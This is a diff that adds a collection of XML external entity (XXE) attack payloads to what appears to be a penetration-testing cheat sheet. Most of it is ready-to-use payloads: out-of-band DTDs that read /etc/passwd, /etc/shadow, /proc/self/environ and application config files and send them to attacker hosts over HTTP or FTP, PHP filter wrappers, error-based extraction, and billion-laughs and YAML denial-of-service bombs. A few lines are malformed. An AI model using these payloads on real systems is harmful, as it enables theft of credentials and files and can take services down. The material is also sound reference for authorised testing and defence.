@@ -698,9 +698,277 @@ fragment TypeRef on __Type {
 }
 
 
+XXE_payloads
+--------------------------------------------------------------
+Vanilla, used to verify outbound xxe or blind xxe
+--------------------------------------------------------------
+
+<?xml version="1.0" ?>
+<!DOCTYPE r [
+<!ELEMENT r ANY >
+<!ENTITY sp SYSTEM "http://x.x.x.x:443/test.txt">
+]>
+<r>&sp;</r>
+
+---------------------------------------------------------------
+OoB extraction
+---------------------------------------------------------------
+
+<?xml version="1.0" ?>
+<!DOCTYPE r [
+<!ELEMENT r ANY >
+<!ENTITY % sp SYSTEM "http://x.x.x.x:443/ev.xml">
+%sp;
+%param1;
+]>
+<r>&exfil;</r>
+
+## External dtd: ##
+
+<!ENTITY % data SYSTEM "file:///c:/windows/win.ini">
+<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://x.x.x.x:443/?%data;'>">
+
+----------------------------------------------------------------
+OoB variation of above (seems to work better against .NET)
+----------------------------------------------------------------
+<?xml version="1.0" ?>
+<!DOCTYPE r [
+<!ELEMENT r ANY >
+<!ENTITY % sp SYSTEM "http://x.x.x.x:443/ev.xml">
+%sp;
+%param1;
+%exfil;
+]>
+
+## External dtd: ##
+
+<!ENTITY % data SYSTEM "file:///c:/windows/win.ini">
+<!ENTITY % param1 "<!ENTITY &#x25; exfil SYSTEM 'http://x.x.x.x:443/?%data;'>">
+
+---------------------------------------------------------------
+OoB extraction
+---------------------------------------------------------------
+
+<?xml version="1.0"?>
+<!DOCTYPE r [
+<!ENTITY % data3 SYSTEM "file:///etc/shadow">
+<!ENTITY % sp SYSTEM "http://EvilHost:port/sp.dtd">
+%sp;
+%param3;
+%exfil;
+]>
+
+## External dtd: ##
+<!ENTITY % param3 "<!ENTITY &#x25; exfil SYSTEM 'ftp://Evilhost:port/%data3;'>">
+
+-----------------------------------------------------------------------
+OoB extra ERROR -- Java
+-----------------------------------------------------------------------
+<?xml version="1.0"?>
+<!DOCTYPE r [
+<!ENTITY % data3 SYSTEM "file:///etc/passwd">
+<!ENTITY % sp SYSTEM "http://x.x.x.x:8080/ss5.dtd">
+%sp;
+%param3;
+%exfil;
+]>
+<r></r>
+## External dtd: ##
+
+<!ENTITY % param1 '<!ENTITY &#x25; external SYSTEM "file:///nothere/%payload;">'> %param1; %external;
 
 
+-----------------------------------------------------------------------
+OoB extra nice
+-----------------------------------------------------------------------
 
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE root [
+ <!ENTITY % start "<![CDATA[">
+ <!ENTITY % stuff SYSTEM "file:///usr/local/tomcat/webapps/customapp/WEB-INF/applicationContext.xml ">
+<!ENTITY % end "]]>">
+<!ENTITY % dtd SYSTEM "http://evil/evil.xml">
+%dtd;
+]>
+<root>&all;</root>
+ 
+## External dtd: ##
+ 
+<!ENTITY all "%start;%stuff;%end;">
+
+------------------------------------------------------------------
+File-not-found exception based extraction
+------------------------------------------------------------------
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [  
+  <!ENTITY % one SYSTEM "http://attacker.tld/dtd-part" >
+  %one;
+  %two;
+  %four;
+]>
+
+## External dtd: ##
+
+<!ENTITY % three SYSTEM "file:///etc/passwd">
+<!ENTITY % two "<!ENTITY % four SYSTEM 'file:///%three;'>">
+
+-------------------------^ you might need to encode this % (depends on your target) as: &#x25;
+
+--------------
+FTP
+--------------
+<?xml version="1.0" ?>
+<!DOCTYPE a [ 
+<!ENTITY % asd SYSTEM "http://x.x.x.x:4444/ext.dtd">
+%asd;
+%c;
+]>
+<a>&rrr;</a>
+
+
+## External dtd ##
+<!ENTITY % d SYSTEM "file:///proc/self/environ">
+<!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://x.x.x.x:2121/%d;'>">
+
+---------------------------
+Inside SOAP body
+---------------------------
+<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
+
+
+---------------------------
+Untested - WAF Bypass
+---------------------------
+<!DOCTYPE :. SYTEM "http://"
+<!DOCTYPE :_-_: SYTEM "http://"
+<!DOCTYPE {0xdfbf} SYSTEM "http://"
+
+
+ML External Entity - Injection - Payloads
+Basic XXE Test
+
+<!--?xml version="1.0" ?-->
+<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
+ <userInfo>
+  <firstName>John</firstName>
+  <lastName>&example;</lastName>
+ </userInfo>
+
+XML External Entity - Inband Injection
+
+Extract data from the server
+
+<?xml version="1.0"?>
+<!DOCTYPE data [
+<!ELEMENT data (#ANY)>
+<!ENTITY file SYSTEM "file:///etc/passwd">
+]>
+<data>&file;</data>
+
+<?xml version="1.0" encoding="ISO-8859-1"?>
+  <!DOCTYPE foo [  
+  <!ELEMENT foo ANY >
+  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
+
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [  
+  <!ELEMENT foo ANY >
+  <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>
+
+XXE Base64 encoded
+
+<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
+
+PHP Wrapper inside XXE
+
+<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
+<contacts>
+  <contact>
+	<name>Jean &xxe; Dupont</name>
+	<phone>00 11 22 33 44</phone>
+	<adress>42 rue du CTF</adress>
+	<zipcode>75000</zipcode>
+	<city>Paris</city>
+  </contact>
+</contacts>
+
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+<!ELEMENT foo ANY >
+<!ENTITY % xxe SYSTEM "php://filter/convert.base64-encode/resource=http://attacker.com/file.php" >
+]>
+<foo>&xxe;</foo>
+
+XML External Entities - Billion Laugh Attack - Denial Of Service
+
+Denial-of-service attack by including a potentially endless file
+
+<!ENTITY xxe SYSTEM "file:///dev/random" >]>
+
+<!DOCTYPE data [
+<!ENTITY a0 "dos" >
+<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
+<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
+<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
+<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
+]>
+<data>&a4;</data>
+
+Yaml attack
+
+a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
+b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
+c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
+d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
+e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
+f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
+g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
+h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
+i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
+
+Blind XXE
+
+Blind XXE
+
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+<!ELEMENT foo ANY >
+<!ENTITY % xxe SYSTEM "file:///etc/passwd" >
+<!ENTITY callhome SYSTEM "www.malicious.com/?%xxe;">
+]
+>
+<foo>&callhome;</foo>
+
+XXE OOB Attack
+
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE data SYSTEM "http://publicServer.com/parameterEntity_oob.dtd">
+<data>&send;</data>
+
+File stored on http://publicServer.com/parameterEntity_oob.dtd
+<!ENTITY % file SYSTEM "file:///sys/power/image_size">
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://publicServer.com/?%file;'>">
+%all;
+
+XXE OOB with DTD and PHP filter
+
+<?xml version="1.0" ?>
+<!DOCTYPE r [
+<!ELEMENT r ANY >
+<!ENTITY % sp SYSTEM "http://127.0.0.1/dtd.xml">
+%sp;
+%param1;
+]>
+<r>&exfil;</r>
+
+File stored on http://127.0.0.1/dtd.xml
+<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://127.0.0.1/dtd.xml?%data;'>">
+
+XXE Inside SOAP
+
+<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
 
 
 
